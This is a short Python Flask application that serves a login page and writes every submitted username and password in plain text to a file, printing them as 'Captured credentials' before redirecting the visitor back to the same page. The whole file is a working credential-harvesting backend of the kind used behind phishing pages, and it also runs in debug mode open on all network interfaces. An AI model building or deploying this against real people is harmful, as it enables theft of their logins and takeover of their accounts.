from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__, template_folder='templates')

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("login_data.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")
    print(f"Captured credentials - Username: {username}, Password: {password}")
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
